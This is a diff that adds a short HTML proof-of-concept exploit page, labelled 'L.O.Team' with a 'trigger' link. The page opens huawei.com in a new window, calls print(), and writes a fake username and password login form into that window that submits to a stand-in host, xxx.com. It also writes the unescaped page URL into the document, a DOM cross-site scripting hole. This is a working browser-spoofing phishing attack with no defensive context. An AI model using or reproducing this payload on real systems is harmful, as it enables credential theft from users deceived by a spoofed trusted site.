@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+document.write(unescape(location.href));
+function induce(){
+  var poc=window.open('https://www.huawei.com','_blank');
+  window.focus();
+  
+  print();
+  poc.document.write(unescape("<form action='http://xxx.com'>username:<input type=text><BR>password:<input type=password><BR><input type=submit value=login></form>"));
+  }
+  </script>
+</head>
+<body>
+<H3>L.O.Team<H3><BR>
+<a href="#" onclick="induce()"><font size="18px">trigger</font></a>
+</body>
+</html>
